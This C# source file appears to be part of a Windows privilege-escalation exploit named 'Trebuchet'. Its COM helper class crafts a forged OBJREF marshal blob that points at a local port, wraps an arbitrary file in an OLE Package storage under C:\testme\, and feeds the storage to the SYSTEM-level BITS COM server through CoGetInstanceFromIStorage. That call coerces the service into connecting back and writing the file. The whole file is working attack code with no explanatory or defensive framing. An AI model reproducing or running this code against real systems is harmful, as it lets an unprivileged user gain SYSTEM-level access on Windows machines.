﻿using Microsoft.VisualStudio.OLE.Interop;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Trebuchet
{
    static class ComUtils
    {
        [DllImport("ole32.dll")]
        static extern int CreateObjrefMoniker(
                IntPtr punk,
                out IMoniker ppmk);

        [DllImport("ole32.dll")]
        static extern int CreateBindCtx(
              int reserved,
              out IBindCtx ppbc
            );

        [StructLayout(LayoutKind.Sequential)]
        struct MULTI_QI
        {
            public IntPtr pIID;
            [MarshalAs(UnmanagedType.Interface)]
            public object pItf;
            public int hr;
        }

        [Flags]
        public enum STGM : int
        {
            DIRECT = 0x00000000,
            TRANSACTED = 0x00010000,
            SIMPLE = 0x08000000,
            READ = 0x00000000,
            WRITE = 0x00000001,
            READWRITE = 0x00000002,
            SHARE_DENY_NONE = 0x00000040,
            SHARE_DENY_READ = 0x00000030,
            SHARE_DENY_WRITE = 0x00000020,
            SHARE_EXCLUSIVE = 0x00000010,
            PRIORITY = 0x00040000,
            DELETEONRELEASE = 0x04000000,
            NOSCRATCH = 0x00100000,
            CREATE = 0x00001000,
            CONVERT = 0x00020000,
            FAILIFTHERE = 0x00000000,
            NOSNAPSHOT = 0x00200000,
            DIRECT_SWMR = 0x00400000,
        }

        [StructLayout(LayoutKind.Sequential)]
        class COSERVERINFO
        {
            public uint dwReserved1;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pwszName;
            public IntPtr pAuthInfo;
            public uint dwReserved2;
        }

        [DllImport("ole32.dll", PreserveSig = false, CharSet = CharSet.Unicode)]
        static extern void StgCreateDocfile([MarshalAs(UnmanagedType.LPWStr)]
            string pwcsName, STGM grfMode, uint reserved, out IStorage ppstgOpen);

        const uint GMEM_MOVEABLE = 2;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);

        [DllImport("ole32.dll", PreserveSig = false, ExactSpelling = true)]
        static extern void CreateILockBytesOnHGlobal(
                IntPtr hGlobal,
                [MarshalAs(UnmanagedType.Bool)] bool fDeleteOnRelease,
                out IntPtr ppLkbyt);

        static IntPtr GuidToPointer(string guid)
        {
            Guid g = new Guid(guid);

            IntPtr ret = Marshal.AllocCoTaskMem(16);
            Marshal.Copy(g.ToByteArray(), 0, ret, 16);

            return ret;
        }

        [DllImport("ole32.dll", PreserveSig = false, ExactSpelling = true)]
        static extern void StgCreateDocfileOnILockBytes(
             IntPtr plkbyt,
             STGM grfMode,
             uint reserved,
             out IStorage ppstgOpen);

        public static IntPtr IID_IUnknownPtr = GuidToPointer("00000000-0000-0000-C000-000000000046");

        [DllImport("ole32.dll", PreserveSig = false, ExactSpelling = true)]
        static extern void CoGetInstanceFromIStorage(COSERVERINFO pServerInfo, ref Guid pclsid,
           [MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter, CLSCTX dwClsCtx,
           IStorage pstg, uint cmq, [In, Out] MULTI_QI[] rgmqResults);

        [DllImport("ole32.dll", PreserveSig = false, ExactSpelling = true, CharSet = CharSet.Unicode)]
        static extern void CoGetInstanceFromFile(
                    COSERVERINFO pServerInfo,
                    ref Guid pClsid,
                    [MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter,
                    CLSCTX dwClsCtx,
                    STGM grfMode,
                    string pwszName,
                    uint cmq,
                    [In, Out] MULTI_QI[] rgmqResults);

        [DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
        static extern void CoCreateInstanceEx(
           [In, MarshalAs(UnmanagedType.LPStruct)] Guid rclsid,
           [MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter,
           CLSCTX dwClsCtx,
           COSERVERINFO pServerInfo,
           uint cmq,
           [In, Out] MULTI_QI[] pResults);

        public delegate uint OleStreamMethod(IntPtr a, IntPtr b, uint c);

        [StructLayout(LayoutKind.Sequential)]
        public class OLESTREAM
        {
            [MarshalAs(UnmanagedType.FunctionPtr)]
            public OleStreamMethod GetMethod;
            [MarshalAs(UnmanagedType.FunctionPtr)]
            public OleStreamMethod SetMethod;
        }

        [DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
        static extern void OleConvertOLESTREAMToIStorage(
            ref OLESTREAM lpolestream,
            IStorage pstg,
            IntPtr ptd);

        [DllImport("Shlwapi.dll", CharSet = CharSet.Unicode, PreserveSig = false)]
        static extern void SHCreateStreamOnFile(
            string pszFile,
            STGM grfMode,
            out IStream ppstm
        );

        [Flags]
        public enum CLSCTX : uint
        {
            CLSCTX_INPROC_SERVER = 0x1,
            CLSCTX_INPROC_HANDLER = 0x2,
            CLSCTX_LOCAL_SERVER = 0x4,
            CLSCTX_INPROC_SERVER16 = 0x8,
            CLSCTX_REMOTE_SERVER = 0x10,
            CLSCTX_INPROC_HANDLER16 = 0x20,
            CLSCTX_RESERVED1 = 0x40,
            CLSCTX_RESERVED2 = 0x80,
            CLSCTX_RESERVED3 = 0x100,
            CLSCTX_RESERVED4 = 0x200,
            CLSCTX_NO_CODE_DOWNLOAD = 0x400,
            CLSCTX_RESERVED5 = 0x800,
            CLSCTX_NO_CUSTOM_MARSHAL = 0x1000,
            CLSCTX_ENABLE_CODE_DOWNLOAD = 0x2000,
            CLSCTX_NO_FAILURE_LOG = 0x4000,
            CLSCTX_DISABLE_AAA = 0x8000,
            CLSCTX_ENABLE_AAA = 0x10000,
            CLSCTX_FROM_DEFAULT_CONTEXT = 0x20000,
            CLSCTX_ACTIVATE_32_BIT_SERVER = 0x40000,
            CLSCTX_ACTIVATE_64_BIT_SERVER = 0x80000,
            CLSCTX_INPROC = CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER,
            CLSCTX_SERVER = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_REMOTE_SERVER,
            CLSCTX_ALL = CLSCTX_SERVER | CLSCTX_INPROC_HANDLER
        }

        static byte[] GenerateStringBindings(IEnumerable<string> names)
        {
            using (MemoryStream stm = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(stm))
                {
                    foreach (string name in names)
                    {
                        ushort towerId = 7;
                        string address = name;

                        if (name.StartsWith("@"))
                        {
                            string[] v = name.Substring(1).Split(':');

                            if (v.Length != 2)
                            {
                                throw new InvalidDataException(String.Format("Invalid name {0}", name));
                            }

                            towerId = ushort.Parse(v[0]);
                            address = v[1];
                        }

                        writer.Write(towerId);
                        writer.Write(Encoding.Unicode.GetBytes(address + "\0"));
                    }

                    writer.Write((ushort)0);
                }

                return stm.ToArray();
            }
        }

        static byte[] GenerateSecurityBindings()
        {
            // RPC_C_AUTHN_WINNT - 0x0A
            using (MemoryStream stm = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(stm))
                {
                    writer.Write((ushort)0xA);
                    writer.Write((ushort)0xFFFF);
                    writer.Write((ushort)0);

                    writer.Write((ushort)0);
                }

                return stm.ToArray();
            }
        }

        static byte[] GenerateDualStringArray(IEnumerable<string> names)
        {
            byte[] stringBindings = GenerateStringBindings(names);
            byte[] securityBindings = GenerateSecurityBindings();

            using (MemoryStream stm = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(stm))
                {
                    ushort totalLength = (ushort)((stringBindings.Length + securityBindings.Length) / 2);
                    ushort securityOffset = (ushort)(stringBindings.Length / 2);

                    writer.Write(totalLength);
                    writer.Write(securityOffset);
                    writer.Write(stringBindings);
                    writer.Write(securityBindings);
                }

                return stm.ToArray();
            }
        }

        public static byte[] CreateStandardMarshal(params string[] names)
        {
            Random r = new Random();

            using (MemoryStream stm = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(stm))
                {
                    Guid iid_IUnknown = Guid.Parse("00000000-0000-0000-C000-000000000046");

                    writer.Write(0x574f454d); // MEOW
                    writer.Write(0x00000001); // OBJREF_STANDARD
                    writer.Write(iid_IUnknown.ToByteArray()); // IID_IUnknown

                    // STANDARD Structure
                    writer.Write(0); // Flags
                    writer.Write(1); // cPublicRefs

                    // Concatenation of oxid, opid and ipid
                    byte[] ids = new byte[32];

                    r.NextBytes(ids);
                    writer.Write(ids);

                    writer.Write(GenerateDualStringArray(names));
                }

                return stm.ToArray();
            }
        }

        public static IStorage CreateStorage()
        {
            IntPtr gh = IntPtr.Zero;
            IntPtr lb;
            IStorage ret;

            ComUtils.CreateILockBytesOnHGlobal(gh, true, out lb);
            ComUtils.StgCreateDocfileOnILockBytes(lb, STGM.CREATE | STGM.READWRITE | STGM.SHARE_EXCLUSIVE, 0, out ret);

            return ret;
        }

        public static IStorage CreateStorage(string path)
        {
            IStorage stg;

            ComUtils.StgCreateDocfile(path, STGM.CREATE | STGM.READWRITE | STGM.SHARE_EXCLUSIVE, 0, out stg);

            return stg;
        }

        public static IStream CreateStream(string path)
        {
            IStream stm;

            SHCreateStreamOnFile(path, STGM.READWRITE, out stm);

            return stm;
        }

        public const string CLSID_Package = "f20da720-c02f-11ce-927b-0800095ae340";

        public static IStorage CreatePackageStorage(string name, byte[] filedata)
        {
            MemoryStream ms = new MemoryStream(PackageBuilder.BuildPackage(@"C:\testme\"+name, filedata));
            IStorage stg = CreateStorage("dump.stg");
            ComUtils.OLESTREAM stm = new ComUtils.OLESTREAM();
            stm.GetMethod = (a, b, c) =>
            {
                //Console.WriteLine("{0} {1} {2}", a, b, c);

                byte[] data = new byte[c];

                int len = ms.Read(data, 0, (int)c);

                Marshal.Copy(data, 0, b, len);

                return (uint)len;
            };

            OleConvertOLESTREAMToIStorage(ref stm, stg, IntPtr.Zero);
           // Console.WriteLine("Creating File...");
            Guid g = new Guid(CLSID_Package);
            stg.SetClass(ref g);

            return stg;
        }

        public static byte[] GetMarshalledObject(object o)
        {
            IMoniker mk;

            CreateObjrefMoniker(Marshal.GetIUnknownForObject(o), out mk);

            IBindCtx bc;

            CreateBindCtx(0, out bc);

            string name;

            mk.GetDisplayName(bc, null, out name);

            return Convert.FromBase64String(name.Substring(7).TrimEnd(':'));
        }

        public static void BootstrapComMarshal(int port)
        {
            IStorage stg = ComUtils.CreateStorage();

            // Use a known local system service COM server, in this cast BITSv1
            Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");

            TestClass c = new TestClass(stg, String.Format("127.0.0.1[{0}]", port));

            MULTI_QI[] qis = new MULTI_QI[1];

            qis[0].pIID = ComUtils.IID_IUnknownPtr;
            qis[0].pItf = null;
            qis[0].hr = 0;
            //Console.WriteLine("Converting the Data!");
            try
            {
                CoGetInstanceFromIStorage(null, ref clsid,
                null, CLSCTX.CLSCTX_LOCAL_SERVER, c, 1, qis);
            }
            catch
            {
                //Console.WriteLine("Caught it!");
            }
            //Console.WriteLine("Finished with BootStrap!");
        }
    }
}
